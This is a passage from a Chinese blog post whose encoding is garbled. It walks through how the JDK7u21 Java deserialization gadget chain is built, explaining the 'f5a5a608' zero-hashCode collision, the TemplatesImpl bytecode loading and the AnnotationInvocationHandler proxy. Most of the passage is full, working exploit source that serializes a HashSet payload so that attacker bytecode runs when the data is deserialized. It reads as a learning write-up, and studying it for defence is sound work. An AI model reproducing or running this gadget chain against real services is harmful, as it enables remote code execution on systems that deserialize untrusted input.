ã€‚</p><p>kæ˜¯tableè¿™ä¸ªé”®å€¼å¯¹ï¼ˆEntryï¼‰çš„key</p><p>è·Ÿä¸€ä¸‹putå‡½æ•°å†…çš„addEntryï¼Œæ‰¾åˆ°äº†å‘tableæ·»åŠ æ–°Entryçš„å‡½æ•°</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240910210202471.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240910210202471.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>æ‰€ä»¥å¦‚ä¸‹ï¼š</p><ul><li>å…ˆå‘hashmap putä¸€ä¸ªkeyä¸ºtemplatesImplæ¶æ„å­—èŠ‚ç å¯¹è±¡ï¼Œè¿›è€Œå­˜è¿›table</li><li>å†putä¸€ä¸ªkeyä¸ºAnnotationInvocationHandlerä»£ç†ç±»ï¼Œè§¦å‘equals</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">map.put(templatesClass,<span class="literal">null</span>);</span><br><span class="line">map.put(annotationInvocationHandler,<span class="literal">null</span>);</span><br></pre></td></tr></table></figure><h2 id="hashç¢°æ’è§¦å‘equals"><a href="#hashç¢°æ’è§¦å‘equals" class="headerlink" title="hashç¢°æ’è§¦å‘equals"></a>hashç¢°æ’è§¦å‘equals</h2><p>ç°åœ¨æœ‰ä¸ªé—®é¢˜ï¼Œå°±æ˜¯è¿›ä¸äº†forå¾ªç¯ï¼š</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240914144218579.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240914144218579.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>ç»è¿‡è°ƒè¯•ï¼Œç¬¬äºŒæ¬¡putè¿›å»æ—¶ï¼Œç”±äºhashå€¼å’Œç¬¬ä¸€æ¬¡putçš„keyä¸åŒï¼Œç´¢å¼•å€¼iä¹Ÿå°±ä¸åŒã€‚å°±ä¸ä¼šå–åˆ°table[i]è¿›è¡Œequalså¯¹æ¯”</p><blockquote><p>æˆ‘è¿™é‡Œæƒ³åˆ°ä¸€ä¸ªåŠæ³•ï¼Œæ—¢ç„¶hashæ˜¯ç”¨æ¥å–tableç´¢å¼•å€¼çš„ï¼Œé‚£æŠŠç¬¬ä¸€ä¸ªkeyç›´æ¥ä¿®æ”¹åˆ°ç¬¬äºŒä¸ªkeyç´¢å¼•çš„tableä¸å°±è¡Œäº†</p><p>æ¯”å¦‚templatesImplå¯¹åº”ç´¢å¼•iä¸º4ï¼ŒannotationInvocationHandlerå¯¹åº”iä¸º14ï¼Œé‚£æŠŠtempltesImplç›´æ¥èµ‹å€¼åˆ°table[14]ï¼Œå°±èƒ½å®Œæˆå¯¹æ¯”ã€‚å¯æƒœtableæ˜¯transientä¸èƒ½ä¿®æ”¹</p></blockquote><p>æ­£ç¡®çš„æ–¹æ³•æ˜¯hashç¢°æ’</p><p>åœ¨put annotationInvocationHandleræ—¶ï¼Œç”±äºkeyæ˜¯ä»£ç†ç±»ï¼Œåœ¨è°ƒç”¨hash(key)æ—¶ï¼Œk.hashCodeä¼šè·³è½¬åˆ°annotationInvocationHandler.invoke</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240914152637028.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240914152637028.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>è¿›è€Œè·³è½¬è‡³hashCodeImpl()</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240914152734565.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240914152734565.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="type">int</span> <span class="title function_">hashCodeImpl</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">int</span> <span class="variable">var1</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    Map.Entry var3;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">Iterator</span> <span class="variable">var2</span> <span class="operator">=</span> <span class="built_in">this</span>.memberValues.entrySet().iterator();</span><br><span class="line">        var2.hasNext(); </span><br><span class="line">        var1 += <span class="number">127</span> * ((String)var3.getKey()).hashCode() ^ memberValueHashCode(var3.getValue())) </span><br><span class="line">    &#123;</span><br><span class="line">        var3 = (Map.Entry)var2.next();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> var1;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¯¥å‡½æ•°éå† this.memberValues çš„æ‰€æœ‰é”®å€¼å¯¹ï¼Œç´¯åŠ è®¡ç®—ä¸€ä¸ªå“ˆå¸Œå€¼ã€‚å…·ä½“æ­¥éª¤å¦‚ä¸‹ï¼š</p><ol><li>è·å– memberValues çš„æ¡ç›®è¿­ä»£å™¨ã€‚</li><li>éå†è¿‡ç¨‹ä¸­ï¼Œæ¯æ¬¡å–ä¸€æ¡é”®å€¼å¯¹ã€‚</li><li>è®¡ç®—å“ˆå¸Œå€¼</li></ol><p>memberValuesæ˜¯æ„é€ å‡½æ•°ä¼ å…¥çš„var2</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240914154747694.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240914154747694.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>å¦‚æœä¼ å…¥çš„var2åªæœ‰ä¸€ä¸ªEntryï¼Œé‚£var1å°±ç­‰äº</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">127</span> * ((String)var3.getKey()).hashCode() ^ memberValueHashCode(var3.getValue())</span><br></pre></td></tr></table></figure><p>å¦‚æœ<code>127 * ((String)var3.getKey()).hashCode()</code>ç­‰äº0ï¼Œä»»ä½•æ•°å¼‚æˆ–0ç­‰äºå…¶æœ¬èº«ã€‚ä¸Šå¼ç­‰äº<code>memberValueHashCode(var3.getValue())</code></p><p>memberValueHashCodeæ ¹æ®ä¸åŒçš„æ•°æ®ç±»å‹è·å–hashå€¼</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240914155513192.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240914155513192.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>ä¹Ÿå°±æ˜¯è¯´ï¼Œå‡å¦‚<code>((String)var3.getKey()).hashCode()</code>ç­‰äº0æ—¶ï¼Œè¿”å›çš„var1æ˜¯ä¼ å…¥AnnotationInvocationHandlerç¬¬äºŒä¸ªå‚æ•°mapçš„hashCode(Value)</p><p>ä»¤è¯¥Valueç­‰äºç¬¬ä¸€æ¬¡putçš„keyï¼Œä¹Ÿå°±æ˜¯templatesClassæ¶æ„ç±»å¯¹è±¡ï¼Œå…¶hashCodeå°±ç›¸åŒï¼Œè¿”å›å€¼ç›¸åŒï¼Œèƒ½èµ°è¿›forå¾ªç¯è§¦å‘equals</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240914152637028.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240914152637028.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>ä¸€åˆ‡çš„é—®é¢˜ï¼Œéƒ½åœ¨äºæ€ä¹ˆä½¿<code>((String)var3.getKey()).hashCode()</code>&#x3D;0</p><p><code>f5a5a608</code>hashCodeå€¼ä¸º0</p><p>äºæ˜¯ï¼Œä»£ç å¦‚ä¸‹ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.xml.transform.Templates;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.*;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Files;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Paths;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">JDK7u21</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">byte</span>[] code1 = Files.readAllBytes(Paths.get(<span class="string">&quot;E:\\codecollect\\RMIServer\\RMIServer\\target\\classes\\org\\example\\RuntimeEvil.class&quot;</span>));</span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templatesClass</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        Field[] fields = templatesClass.getClass().getDeclaredFields();</span><br><span class="line">        <span class="keyword">for</span> (Field field : fields) &#123;</span><br><span class="line">            field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">            <span class="keyword">if</span> (field.getName().equals(<span class="string">&quot;_bytecodes&quot;</span>)) &#123;</span><br><span class="line">                field.set(templatesClass, <span class="keyword">new</span> <span class="title class_">byte</span>[][]&#123;code1&#125;);</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (field.getName().equals(<span class="string">&quot;_name&quot;</span>)) &#123;</span><br><span class="line">                field.set(templatesClass, <span class="string">&quot;godown&quot;</span>);</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (field.getName().equals(<span class="string">&quot;_tfactory&quot;</span>)) &#123;</span><br><span class="line">                field.set(templatesClass, <span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">Class</span> <span class="variable">clazz</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line">        <span class="type">Constructor</span> <span class="variable">constructor</span> <span class="operator">=</span> clazz.getDeclaredConstructor(Class.class, Map.class);</span><br><span class="line">        constructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">HashMap</span> <span class="variable">Annovar2map</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        Annovar2map.put(<span class="string">&quot;f5a5a608&quot;</span>,templatesClass);</span><br><span class="line">        <span class="type">HashMap</span> <span class="variable">map</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        <span class="type">InvocationHandler</span> <span class="variable">annotationInvocationHandler</span> <span class="operator">=</span> (InvocationHandler) constructor.newInstance(Override.class, Annovar2map);</span><br><span class="line">        <span class="type">Field</span> <span class="variable">typeField</span> <span class="operator">=</span> annotationInvocationHandler.getClass().getDeclaredField(<span class="string">&quot;type&quot;</span>);</span><br><span class="line">        typeField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        typeField.set(annotationInvocationHandler, Templates.class);</span><br><span class="line">        <span class="type">Map</span> <span class="variable">annoProxy</span> <span class="operator">=</span> (Map) Proxy.newProxyInstance(Map.class.getClassLoader(),<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Map.class&#125;,annotationInvocationHandler);</span><br><span class="line">        map.put(templatesClass,<span class="literal">null</span>);</span><br><span class="line">        map.put(annoProxy,<span class="literal">null</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="é“¾æ¥åˆ°readObject"><a href="#é“¾æ¥åˆ°readObject" class="headerlink" title="é“¾æ¥åˆ°readObject"></a>é“¾æ¥åˆ°readObject</h2><h3 id="HashSetç‰ˆ"><a href="#HashSetç‰ˆ" class="headerlink" title="HashSetç‰ˆ"></a>HashSetç‰ˆ</h3><p>HashSet.readObjectè°ƒç”¨äº†put</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240914201209303.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240914201209303.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>ä½†æ˜¯ç”±äºHashSetåœ¨addçš„æ—¶å€™å°±ä¼šè°ƒç”¨putï¼Œå°±ä¼šç±»ä¼¼URLDNSåœ¨ååºåˆ—åŒ–ä¹‹å‰å°±è§¦å‘ï¼Œå½±å“åˆ¤æ–­</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240914195459462.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240914195459462.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>æ‰€ä»¥å…ˆæŠŠannoProxyçš„æ„é€ å‡½æ•°ä¼ å…¥çš„ä¸¤ä¸ªå€¼ä»»é€‰ä¸€ä¸ªå…ˆä¿®æ”¹</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">JDK7u21</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">byte</span>[] code1 = Files.readAllBytes(Paths.get(<span class="string">&quot;E:\\codecollect\\RMIServer\\RMIServer\\target\\classes\\org\\example\\RuntimeEvil.class&quot;</span>));</span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templatesClass</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        Field[] fields = templatesClass.getClass().getDeclaredFields();</span><br><span class="line">        <span class="keyword">for</span> (Field field : fields) &#123;</span><br><span class="line">            field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">            <span class="keyword">if</span> (field.getName().equals(<span class="string">&quot;_bytecodes&quot;</span>)) &#123;</span><br><span class="line">                field.set(templatesClass, <span class="keyword">new</span> <span class="title class_">byte</span>[][]&#123;code1&#125;);</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (field.getName().equals(<span class="string">&quot;_name&quot;</span>)) &#123;</span><br><span class="line">                field.set(templatesClass, <span class="string">&quot;godown&quot;</span>);</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (field.getName().equals(<span class="string">&quot;_tfactory&quot;</span>)) &#123;</span><br><span class="line">                field.set(templatesClass, <span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">Class</span> <span class="variable">clazz</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line">        <span class="type">Constructor</span> <span class="variable">constructor</span> <span class="operator">=</span> clazz.getDeclaredConstructor(Class.class, Map.class);</span><br><span class="line">        constructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">HashMap</span> <span class="variable">Annovar2map</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        Annovar2map.put(<span class="string">&quot;f5a5a608&quot;</span>,templatesClass);</span><br><span class="line">        <span class="type">InvocationHandler</span> <span class="variable">annotationInvocationHandler</span> <span class="operator">=</span> (InvocationHandler) constructor.newInstance(Override.class, Annovar2map);</span><br><span class="line">        <span class="type">Field</span> <span class="variable">typeField</span> <span class="operator">=</span> annotationInvocationHandler.getClass().getDeclaredField(<span class="string">&quot;type&quot;</span>);</span><br><span class="line">        typeField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">Map</span> <span class="variable">annoProxy</span> <span class="operator">=</span> (Map) Proxy.newProxyInstance(Map.class.getClassLoader(),<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Map.class&#125;,annotationInvocationHandler);</span><br><span class="line">        <span class="type">HashSet</span> <span class="variable">annoset</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashSet</span>(<span class="number">2</span>);</span><br><span class="line">        annoset.add(templatesClass);</span><br><span class="line">        annoset.add(annoProxy);</span><br><span class="line">        typeField.set(annotationInvocationHandler, Templates.class);</span><br><span class="line">        serialize(annoset);</span><br><span class="line">        unserialize(<span class="string">&quot;ser.bin&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">(Object obj)</span> <span class="keyword">throws</span> Exception</span><br><span class="line">    &#123;</span><br><span class="line">        java.io.<span class="type">FileOutputStream</span> <span class="variable">fos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">java</span>.io.FileOutputStream(<span class="string">&quot;ser.bin&quot;</span>);</span><br><span class="line">        java.io.<span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">java</span>.io.ObjectOutputStream(fos);</span><br><span class="line">        oos.writeObject(obj);</span><br><span class="line">        oos.close();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">unserialize</span><span class="params">(String Filename)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException</span><br><span class="line">    &#123;</span><br><span class="line">        java.io.<span class="type">FileInputStream</span> <span class="variable">fis</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">java</span>.io.FileInputStream(Filename);</span><br><span class="line">        java.io.<span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">java</span>.io.ObjectInputStream(fis);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> ois.readObject();</span><br><span class="line">        ois.close();</span><br><span class="line">        <span class="keyword">return</span> obj;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ä¸ºä»€ä¹ˆè¿˜æ˜¯è·‘ä¸äº†ï¼Ÿ</p><p>è°ƒè¯•çš„æ—¶å€™å‘ç°å…ˆputçš„æ˜¯annoProxyï¼Œï¼ˆé€†åºååºåˆ—åŒ–ï¼‰ï¼Œåputçš„templatesClass</p><blockquote><p>è¿™é‡Œå› ä¸ºæ²¡æœ‰AnnotationInvocationHandlerçš„æºç æ‰€ä»¥è°ƒè¯•æŠ¥é”™ï¼Œä¸ç”¨ç®¡ã€‚</p></blockquote><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240914204524924.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240914204524924.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>æ¢ä¸ªé¡ºåºå°±èƒ½çˆ†æ€è¾£ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.xml.transform.Templates;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.*;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Files;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Paths;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.HashSet;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">JDK7u21</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">byte</span>[] code1 = Files.readAllBytes(Paths.get(<span class="string">&quot;E:\\codecollect\\RMIServer\\RMIServer\\target\\classes\\org\\example\\RuntimeEvil.class&quot;</span>));</span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templatesClass</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        Field[] fields = templatesClass.getClass().getDeclaredFields();</span><br><span class="line">        <span class="keyword">for</span> (Field field : fields) &#123;</span><br><span class="line">            field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">            <span class="keyword">if</span> (field.getName().equals(<span class="string">&quot;_bytecodes&quot;</span>)) &#123;</span><br><span class="line">                field.set(templatesClass, <span class="keyword">new</span> <span class="title class_">byte</span>[][]&#123;code1&#125;);</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (field.getName().equals(<span class="string">&quot;_name&quot;</span>)) &#123;</span><br><span class="line">                field.set(templatesClass, <span class="string">&quot;godown&quot;</span>);</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (field.getName().equals(<span class="string">&quot;_tfactory&quot;</span>)) &#123;</span><br><span class="line">                field.set(templatesClass, <span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">Class</span> <span class="variable">clazz</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line">        <span class="type">Constructor</span> <span class="variable">constructor</span> <span class="operator">=</span> clazz.getDeclaredConstructor(Class.class, Map.class);</span><br><span class="line">        constructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">HashMap</span> <span class="variable">Annovar2map</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        Annovar2map.put(<span class="string">&quot;f5a5a608&quot;</span>,templatesClass);</span><br><span class="line">        <span class="type">InvocationHandler</span> <span class="variable">annotationInvocationHandler</span> <span class="operator">=</span> (InvocationHandler) constructor.newInstance(Override.class, Annovar2map);</span><br><span class="line">        <span class="type">Field</span> <span class="variable">typeField</span> <span class="operator">=</span> annotationInvocationHandler.getClass().getDeclaredField(<span class="string">&quot;type&quot;</span>);</span><br><span class="line">        typeField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">Map</span> <span class="variable">annoProxy</span> <span class="operator">=</span> (Map) Proxy.newProxyInstance(Map.class.getClassLoader(),<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Map.class&#125;,annotationInvocationHandler);</span><br><span class="line">        <span class="type">HashSet</span> <span class="variable">annoset</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashSet</span>();</span><br><span class="line">        annoset.add(annoProxy);</span><br><span class="line">        annoset.add(templatesClass);</span><br><span class="line">        typeField.set(annotationInvocationHandler, Templates.class);</span><br><span class="line">        serialize(annoset);</span><br><span class="line">        unserialize(<span class="string">&quot;ser.bin&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">(Object obj)</span> <span class="keyword">throws</span> Exception</span><br><span class="line">    &#123;</span><br><span class="line">        java.io.<span class="type">FileOutputStream</span> <span class="variable">fos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">java</span>.io.FileOutputStream(<span class="string">&quot;ser.bin&quot;</span>);</span><br><span class="line">        java.io.<span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">java</span>.io.ObjectOutputStream(fos);</span><br><span class="line">        oos.writeObject(obj);</span><br><span class="line">        oos.close();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">unserialize</span><span class="params">(String Filename)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException</span><br><span class="line">    &#123;</span><br><span class="line">        java.io.<span class="type">FileInputStream</span> <span class="variable">fis</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">java</span>.io.FileInputStream(Filename);</span><br><span class="line">        java.io.<span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">java</span>.io.ObjectInputStream(fis);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> ois.readObject();</span><br><span class="line">        ois.close();</span><br><span class="line">        <span class="keyword">return</span> obj;</span><br><span class="line">    &#125;</span><br><span 